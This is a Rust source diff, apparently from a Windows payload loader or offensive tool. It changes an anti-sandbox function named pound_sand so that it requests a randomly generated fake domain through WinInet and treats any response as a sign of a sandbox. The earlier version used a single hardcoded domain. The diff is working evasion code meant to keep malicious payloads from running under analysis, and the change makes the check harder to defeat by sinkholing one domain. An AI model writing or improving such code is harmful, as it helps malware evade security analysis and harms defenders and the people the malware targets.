@@ -54,11 +54,17 @@ pub fn xor_encrypt_decrypt(_key: &[u8], text: &[u8]) -> Result<Vec<u8>, Box<dyn 
 */
 
 #[cfg(all(windows, feature = "antisand"))]
-use std::mem;
+extern crate rand;
+#[cfg(all(windows, feature = "antisand"))]
+extern crate windows;
+#[cfg(all(windows, feature = "antisand"))]
+use rand::distributions::Alphanumeric;
+#[cfg(all(windows, feature = "antisand"))]
+use rand::Rng;
 #[cfg(all(windows, feature = "antisand"))]
 use std::ffi::CString;
 #[cfg(all(windows, feature = "antisand"))]
-extern crate windows;
+use std::mem;
 #[cfg(all(windows, feature = "antisand"))]
 use windows::core::PCSTR;
 #[cfg(all(windows, feature = "antisand"))]
@@ -66,7 +72,6 @@ use windows::Win32::Networking::WinInet::{InternetOpenA, InternetOpenUrlA};
 
 #[cfg(all(windows, feature = "antisand"))]
 pub fn pound_sand() -> bool {
-
     // Call InternetOpenA to get a handle that can be used in an actual internet request
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopena
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/Networking/WinInet/fn.InternetOpenA.html
@@ -76,11 +81,23 @@ pub fn pound_sand() -> bool {
     let lpsz_proxy_bypass: PCSTR = unsafe { mem::zeroed() };
     let internet_handle = unsafe { InternetOpenA(lpsz_agent, 0, lpsz_proxy, lpsz_proxy_bypass, 0) };
 
-    // Call InternetOpenUrlA on a fake website; if there is a response, it's a sandbox trying to get you to take further action
+    // Generate a "website" to search for
+    let length = rand::thread_rng().gen_range(20..40);
+    let alphanum: String = rand::thread_rng()
+        .sample_iter(&Alphanumeric)
+        .take(length)
+        .map(char::from)
+        .collect();
+    let mut full_link: String = "https://www.".to_owned();
+    let link_end: String = ".com".to_owned();
+    full_link.push_str(&alphanum);
+    full_link.push_str(&link_end);
+
+    // Call InternetOpenUrlA on the fake website; if there is a response, it's a sandbox trying to get you to take further action
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurla
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/Networking/WinInet/fn.InternetOpenUrlA.html
     let mut lpsz_url: PCSTR = unsafe { mem::zeroed() };
-    lpsz_url.0 = CString::new("https://www.thisisafakewebsiteorelsetheantisanboxcheckwillfail4sure.com").unwrap().into_raw() as *mut u8;
+    lpsz_url.0 = CString::new(full_link).unwrap().into_raw() as *mut u8;
     let website = unsafe { InternetOpenUrlA(internet_handle, lpsz_url, &[], 0, 0) };
     if website != 0 as _ {
         return true
